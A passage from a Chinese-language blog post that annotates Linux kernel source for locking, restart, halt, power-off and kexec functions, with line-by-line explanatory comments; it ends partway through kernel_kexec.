class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct lockdep_map *lock：这是指向 lockdep_map 结构的指针，该结构是 Linux 内核的锁调试工具（称为“lockdep”）用来跟踪锁及其依赖关系的数据结构。它允许 lockdep 检测潜在的死锁和内核中锁使用的其他问题。</span><br><span class="hljs-comment">int nested：这是一个标志，表示锁是否正在从嵌套上下文中释放（即锁是否已被同一线程多次获取）。</span><br><span class="hljs-comment">unsigned long ip：这是释放锁的指令的指令指针（内存地址）。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">lock_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> lockdep_map *lock, <span class="hljs-type">int</span> nested,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br><span class="hljs-keyword">if</span> (unlikely(current-&gt;lockdep_recursion))<br><span class="hljs-keyword">return</span>;<br><br>raw_local_irq_save(flags);<span class="hljs-comment">//保存标志寄存器</span><br>check_flags(flags);<span class="hljs-comment">//检查标志</span><br>current-&gt;lockdep_recursion = <span class="hljs-number">1</span>;<span class="hljs-comment">//指示该线程正在释放锁，此标志用于防止递归锁释放</span><br>trace_lock_release(lock, ip);<span class="hljs-comment">//调用trace_lock_release函数跟踪锁的释放</span><br><span class="hljs-keyword">if</span> (__lock_release(lock, ip))<span class="hljs-comment">//调用__lock_release函数真正释放锁</span><br>check_chain_key(current);<span class="hljs-comment">//如果锁被释放，则调用 check_chain_key 函数对锁执行一些额外的检查。</span><br>current-&gt;lockdep_recursion = <span class="hljs-number">0</span>;<br>raw_local_irq_restore(flags);<span class="hljs-comment">//恢复标志</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="do-raw-read-unlock"><a href="#do-raw-read-unlock" class="headerlink" title="do_raw_read_unlock()"></a>do_raw_read_unlock()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//释放 rwlock（读写器锁）上的读锁。</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_raw_read_unlock</span><span class="hljs-params">(<span class="hljs-type">rwlock_t</span> *lock)</span><br>&#123;<br>    <span class="hljs-comment">//检查 rwlock_t 的magic数，以确保它是一个有效的锁。</span><br>    <span class="hljs-comment">//RWLOCK_BUG_ON 宏用于打印错误消息并在 magic 字段无效时停止内核。</span><br>RWLOCK_BUG_ON(lock-&gt;magic != RWLOCK_MAGIC, lock, <span class="hljs-string">&quot;bad magic&quot;</span>);<br>    <br>    <span class="hljs-comment">//调用 arch_read_unlock 函数来释放锁。 arch_read_unlock 函数是一个特定于体系结构的函数，它执行实际的解锁操作。</span><br>arch_read_unlock(&amp;lock-&gt;raw_lock);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mutex-lock"><a href="#mutex-lock" class="headerlink" title="mutex_lock()"></a>mutex_lock()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __sched <span class="hljs-title function_">mutex_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *lock)</span><br>&#123;<br>might_sleep();<span class="hljs-comment">//确保互斥锁操作不会导致任务在不允许的情况下进入睡眠状态</span><br><br><span class="hljs-keyword">if</span> (!__mutex_trylock_fast(lock))<span class="hljs-comment">//调用__mutex_trylock_fast 函数尝试获取互斥锁。如果函数返回非零值，则表示成功获取锁。</span><br>__mutex_lock_slowpath(lock);<span class="hljs-comment">//如果__mutex_trylock_fast函数返回0，这意味着锁不可用。调用 __mutex_lock_slowpath 函数使当前任务进入睡眠状态，等待锁变得可用，然后在获得锁的时候唤醒任务。</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="might-sleep-宏"><a href="#might-sleep-宏" class="headerlink" title="might_sleep()宏"></a>might_sleep()宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//用于指示 Linux 内核中的当前任务可能会休眠（即进入低功耗状态或等待锁或其他资源可用）。</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> might_sleep() \</span><br><span class="hljs-meta">do &#123; __might_sleep(__FILE__, __LINE__, 0); might_resched(); &#125; while (0)</span><br><span class="hljs-comment">// __might_sleep 函数:记录当前任务的信息和源代码中可能发生睡眠的位置。</span><br><span class="hljs-comment">//might_resched 函数:检查当前任务是否需要重新安排并在必要时重新安排。</span><br><span class="hljs-comment">/**</span><br></code></pre></td></tr></table></figure><h3 id="kernel-restart"><a href="#kernel-restart" class="headerlink" title="kernel_restart()"></a>kernel_restart()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kernel_restart</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmd)</span><br>&#123;<br>kernel_restart_prepare(cmd);<span class="hljs-comment">//重启准备</span><br>migrate_to_reboot_cpu();<span class="hljs-comment">//将当前任务迁移到负责重启系统的CPU。</span><br>syscore_shutdown();<span class="hljs-comment">//关闭系统核心设备和子系统。</span><br><span class="hljs-keyword">if</span> (!cmd)<br>pr_emerg(<span class="hljs-string">&quot;Restarting system\n&quot;</span>);<br><span class="hljs-keyword">else</span><br>pr_emerg(<span class="hljs-string">&quot;Restarting system with command &#x27;%s&#x27;\n&quot;</span>, cmd);<span class="hljs-comment">//向内核日志打印消息</span><br>kmsg_dump(KMSG_DUMP_RESTART);<span class="hljs-comment">//调用 kmsg_dump 函数将内核日志转储到控制台或持久存储设备。</span><br>machine_restart(cmd);<span class="hljs-comment">//执行实际的系统重启操作</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="kernel-restart-prepare"><a href="#kernel-restart-prepare" class="headerlink" title="kernel_restart_prepare()"></a>kernel_restart_prepare()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kernel_restart_prepare</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmd)</span><br>&#123;<br>    <span class="hljs-comment">//通知已注册的重启通知程序即将重启。</span><br>    <span class="hljs-comment">//reboot_notifier_list：已注册通知器列表</span><br>    <span class="hljs-comment">//SYS_RESTART 参数表示系统正在重启</span><br>blocking_notifier_call_chain(&amp;reboot_notifier_list, SYS_RESTART, cmd);<br><br>    system_state = SYSTEM_RESTART;<span class="hljs-comment">//将状态变量设置为 SYSTEM_RESTART，表示系统正在重启。</span><br><br>    <span class="hljs-comment">//禁用用户模式助手 (UMH) 进程</span><br>    <span class="hljs-comment">//UMH 进程用于从内核执行用户空间程序，它通常在系统关闭或重新启动期间被禁用，以防止它启动新程序。</span><br>    usermodehelper_disable();<br>    <br>    <span class="hljs-comment">//关闭系统中的所有设备。此函数可以执行诸如注销设备、禁用设备电源管理和刷新设备缓冲区等任务。</span><br>device_shutdown();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="migrate-to-reboot-cpu"><a href="#migrate-to-reboot-cpu" class="headerlink" title="migrate_to_reboot_cpu()"></a>migrate_to_reboot_cpu()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//迁移任务到reboot指定cpu中</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">migrate_to_reboot_cpu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* The boot cpu is always logical cpu 0 */</span><br>    <span class="hljs-comment">//迁移到特定处理器或 CPU</span><br><span class="hljs-type">int</span> cpu = reboot_cpu;<br><span class="hljs-comment">//禁用热插拔（从正在运行的系统中添加或删除 CPU 的能力）</span><br>cpu_hotplug_disable();<br><br><span class="hljs-comment">/* Make certain the cpu I&#x27;m about to reboot on is online */</span><br>    <span class="hljs-comment">//检查 reboot_cpu 变量中指定的 CPU 是否在线（能够处理任务）。如果不在线，该函数将 cpu 变量设置为系统中第一个在线的 CPU。</span><br><span class="hljs-keyword">if</span> (!cpu_online(cpu))<br>cpu = cpumask_first(cpu_online_mask);<br><br><span class="hljs-comment">/* Prevent races with other tasks migrating this task */</span><br><span class="hljs-comment">//标志防止任务竞争</span><br>    current-&gt;flags |= PF_NO_SETAFFINITY;<br><br><span class="hljs-comment">/* Make certain I only run on the appropriate processor */</span><br>    <span class="hljs-comment">//确保任务将仅在指定的 CPU 上运行</span><br>set_cpus_allowed_ptr(current, cpumask_of(cpu));<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="syscore-shutdown"><a href="#syscore-shutdown" class="headerlink" title="syscore_shutdown()"></a>syscore_shutdown()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//syscore_shutdown 函数通常在系统关闭或重启过程中，在所有任务终止之后，系统断电或重启之前调用。它用于确保所有系统核心操作都正确关闭，并在系统关闭之前执行任何必要的清理。</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">syscore_shutdown</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">syscore_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-comment">//获取互斥量，以防止其他线程修改系统核心操作列表。</span><br>mutex_lock(&amp;syscore_ops_lock);<br><br>    <span class="hljs-comment">//以相反的顺序遍历系统核心操作列表，并为每个操作调用关闭函数</span><br>list_for_each_entry_reverse(ops, &amp;syscore_ops_list, node)<br><span class="hljs-keyword">if</span> (ops-&gt;shutdown) &#123;<br><span class="hljs-keyword">if</span> (initcall_debug)<br>pr_info(<span class="hljs-string">&quot;PM: Calling %pS\n&quot;</span>, ops-&gt;shutdown);<br>ops-&gt;shutdown();<br>&#125;<br><br>mutex_unlock(&amp;syscore_ops_lock);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="syscore-ops"><a href="#syscore-ops" class="headerlink" title="syscore_ops"></a>syscore_ops</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">syscore_ops</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">node</span>;</span><span class="hljs-comment">//用于链表控制，注册和删除syscore对象时操作此链表完成  </span><br><span class="hljs-type">int</span> (*suspend)(<span class="hljs-type">void</span>);<span class="hljs-comment">//睡眠流程时回调函数 </span><br><span class="hljs-type">void</span> (*resume)(<span class="hljs-type">void</span>);<span class="hljs-comment">//唤醒流程时回调函数 </span><br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-type">void</span>);<span class="hljs-comment">//这一级别的回调函数主要用于系统级的重启、停止或者掉电时才会使用 </span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="machine-restart"><a href="#machine-restart" class="headerlink" title="machine_restart"></a>machine_restart</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">machine_restart</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmd)</span><br>&#123;<br>machine_ops.restart(cmd);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="machine-ops"><a href="#machine-ops" class="headerlink" title="machine_ops"></a>machine_ops</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//指向内核需要执行的各种特定于硬件的操作的函数指针。</span><br><span class="hljs-comment">//是从独立代码进入x86硬件的入口指针</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">machine_ops</span> &#123;</span><br><span class="hljs-type">void</span> (*restart)(<span class="hljs-type">char</span> *cmd);<br><span class="hljs-type">void</span> (*halt)(<span class="hljs-type">void</span>);<br><span class="hljs-type">void</span> (*power_off)(<span class="hljs-type">void</span>);<br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-type">void</span>);<br><span class="hljs-type">void</span> (*crash_shutdown)(<span class="hljs-keyword">struct</span> pt_regs *);<br><span class="hljs-type">void</span> (*emergency_restart)(<span class="hljs-type">void</span>);<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">machine_ops</span> <span class="hljs-title">machine_ops</span> =</span> &#123;<br>.power_off= native_machine_power_off,<br>.shutdown= native_machine_shutdown,<br>.restart= native_machine_restart,<br>.halt= native_machine_halt,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEXEC</span><br>.crash_shutdown = native_machine_crash_shutdown,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="kernel-halt"><a href="#kernel-halt" class="headerlink" title="kernel_halt()"></a>kernel_halt()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kernel_halt</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>kernel_shutdown_prepare(SYSTEM_HALT);<span class="hljs-comment">//重启准备</span><br>migrate_to_reboot_cpu();<span class="hljs-comment">//任务迁移到负责reboot的cpu</span><br>syscore_shutdown();<span class="hljs-comment">//关闭系统核心设备和子系统。</span><br>pr_emerg(<span class="hljs-string">&quot;System halted\n&quot;</span>);<br>kmsg_dump(KMSG_DUMP_HALT);<span class="hljs-comment">//日志转储</span><br>machine_halt();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kernel-power-off"><a href="#kernel-power-off" class="headerlink" title="kernel_power_off()"></a>kernel_power_off()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kernel_power_off</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>kernel_shutdown_prepare(SYSTEM_POWER_OFF);<br><span class="hljs-keyword">if</span> (pm_power_off_prepare)<br>pm_power_off_prepare();<br>migrate_to_reboot_cpu();<br>syscore_shutdown();<br>pr_emerg(<span class="hljs-string">&quot;Power down\n&quot;</span>);<br>kmsg_dump(KMSG_DUMP_POWEROFF);<br>machine_power_off();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="kernel-shutdown-prepare"><a href="#kernel-shutdown-prepare" class="headerlink" title="kernel_shutdown_prepare()"></a>kernel_shutdown_prepare()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">kernel_shutdown_prepare</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> system_states state)</span><br>&#123;<br>blocking_notifier_call_chain(&amp;reboot_notifier_list,<br>(state == SYSTEM_HALT) ? SYS_HALT : SYS_POWER_OFF, <span class="hljs-literal">NULL</span>);<br>system_state = state;<br>usermodehelper_disable();<br>device_shutdown();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="native-machine-power-off"><a href="#native-machine-power-off" class="headerlink" title="native_machine_power_off()"></a>native_machine_power_off()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">native_machine_power_off</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">if</span> (pm_power_off) &#123;<br><span class="hljs-keyword">if</span> (!reboot_force)<br>machine_shutdown();<br>pm_power_off();<br>&#125;<br><span class="hljs-comment">/* A fallback in case there is no PM info available */</span><br>tboot_shutdown(TB_SHUTDOWN_HALT);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">native_machine_shutdown</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* Stop the cpus and apics */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_IO_APIC</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Disabling IO APIC before local APIC is a workaround for</span><br><span class="hljs-comment"> * erratum AVR31 in &quot;Intel Atom Processor C2000 Product Family</span><br><span class="hljs-comment"> * Specification Update&quot;. In this situation, interrupts that target</span><br><span class="hljs-comment"> * a Logical Processor whose Local APIC is either in the process of</span><br><span class="hljs-comment"> * being hardware disabled or software disabled are neither delivered</span><br><span class="hljs-comment"> * nor discarded. When this erratum occurs, the processor may hang.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Even without the erratum, it still makes sense to quiet IO APIC</span><br><span class="hljs-comment"> * before disabling Local APIC.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//clear_IO_APIC() 函数是一个清除或重置系统上输入/输出高级可编程中断控制器 (IO-APIC) 状态的函数。 IO-APIC 是一种用于将中断请求 (IRQ) 从设备路由到系统中适当的处理器或内核的设备。</span><br>clear_IO_APIC();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SMP</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Stop all of the others. Also disable the local irq to</span><br><span class="hljs-comment"> * not receive the per-cpu timer interrupt which may trigger</span><br><span class="hljs-comment"> * scheduler&#x27;s load balance.</span><br><span class="hljs-comment"> */</span><br>local_irq_disable();<span class="hljs-comment">//禁用中断</span><br>stop_other_cpus();<span class="hljs-comment">//停止系统中的所有其他 CPU（中央处理器）使用对称多处理 (SMP)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>lapic_shutdown();<span class="hljs-comment">// lapic_shutdown() 函数，关闭系统上的本地 APIC（高级可编程中断控制器）</span><br>restore_boot_irq_mode();<span class="hljs-comment">//将系统的中断请求 (IRQ) 模式恢复为系统启动时的模式。</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HPET_TIMER</span><br>hpet_disable();<span class="hljs-comment">//禁用高精度事件计时器 (HPET)。</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br>x86_platform.iommu_shutdown();<span class="hljs-comment">//平台重启</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kernel-kexec"><a href="#kernel-kexec" class="headerlink" title="kernel_kexec()"></a>kernel_kexec()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//通常用于在发生内核恐慌或其他灾难性故障时执行系统的紧急重启。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">kernel_kexec</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//获取一个互斥量，以防止发生多个并发的 kexec 重启</span><br><span class="hljs-keyword">if</span> (!mutex_trylock(&amp;kexec_mutex))<br><span class="hljs-keyword">return</span> -EBUSY;<br><span class="hljs-keyword">if</span> (!kexec_image) &#123;<br>error = -EINVAL;<br><span class="hljs-keyword">goto</span> Unlock;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEXEC_JUMP</span><br>    <span class="hljs-comment">//查是否已设置 kexec 映像，如果没有则返回错误</span><br><span class="hljs-keyword">if</span> (kexec_image-&gt;preserve_context) &#123;<br>pm_prepare_console();<br>error = freeze_processes();<br><span class="hljs-keyword">if</span> (error) &#123;<br>error = -EBUSY;<br><span class="hljs-keyword">goto</span> Restore_console;<br>&#125;<br>suspend_console();<br>        <span class="hljs-comment">//在 dpm_suspend_start() 之后调用 dpm_suspend_end() 有助于将设备驱动程序与硬件的实际状态同步。</span><br>error = dpm_suspend_start(PMSG_FREEZE);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> Resume_console;<br><span class="hljs-comment">/* At this point, dpm_suspend_start() has been called,</span><br><span class="hljs-comment"> * but *not* dpm_suspend_end(). We *must* call</span><br><span class="hljs-comment"> * dpm_suspend_end() now.  Otherwise, drivers for</span><br><span class="hljs-comment"> * some devices (e.g. interrupt controllers) become</span><br><span class="hljs-comment"> * desynchronized with the actual state of the</span><br><span class="hljs-comment"> * hardware at resume time, and evil weirdness ensues.</span><br><span class="hljs-comment"> */</span><br>error = dpm_suspend_end(PMSG_FREEZE);<br>        <span class="hljs-comment">//通过冻结进程、禁用辅助 CPU 和挂起设备来为系统重启做好准备。</span><br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> Resume_devices;<br>error = suspend_disable_secondary_cpus();<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> Enable_cpus;<br>local_irq_disable();<span class="hljs-comment">//禁用中断</span><br>error = syscore_suspend();<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> Enable_irqs;<br>&#125; <span class="hljs-keyword">else</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#123;<span class="hljs-comment">//reboot</span><br>kexec_in_progress = <span class="hljs-literal">true</span>;<br>kernel_restart_prepare(<span class="hljs-literal">NULL</span>);<br>migrate_to_reboot_cpu();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * migrate_to_reboot_cpu() disables CPU hotplug assuming that</span><br><span class="hljs-comment"> * no further code needs to use CPU hotplug (which is true in</span><br><span class="hljs-comment"> * the reboot case). However, the kexec path depends on using</span><br><span class="hljs-comment"> * CPU hotplug again; so re-enable it here.</span><br><span class="hljs-comment"> */</span><br>cpu_hotplug_enable();<br>pr_emerg(<span class="hljs-string">&quot;Starting new kernel\n&quot;</span>);<br>machine_shutdown();<br>&#125;<br><br>machine_kexec(kexec_image);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEXEC_JUMP</span><br>    <span class="hljs-comment">//用于在系统挂起、恢复和关闭期间需要完成的系统范围的操作。它被调用以恢复系统核心状态。</span><br><span class="hljs-keyword">if</span> (kexec_image-&gt;preserve_context) &#123;<br>syscore_resume();<br> Enable_irqs:<br>local_irq_enable();<span class="hljs-comment">//在当前 CPU 上启用本地中断</span><br> Enable_cpus:<br>suspend_enable_secondary_cpus();<span class="hljs-comment">//挂起后启用辅助 CPU</span><br>dpm_resume_start(PMSG_RESTORE);<br> Resume_devices:<br>dpm_resume_end(PMSG_RESTORE);<span class="hljs-comment">//在系统挂起或休眠操作后调用它来启动恢复设备的过程。</span><br> Resume_console:<br>resume_console();<span class="hljs-comment">//在系统挂起或休眠操作后恢复控制台状态。</span><br>thaw_processes();<span class="hljs-comment">//函数解冻（解冻）之前在系统挂起或休眠操作期间冻结的所有进程。</span><br> 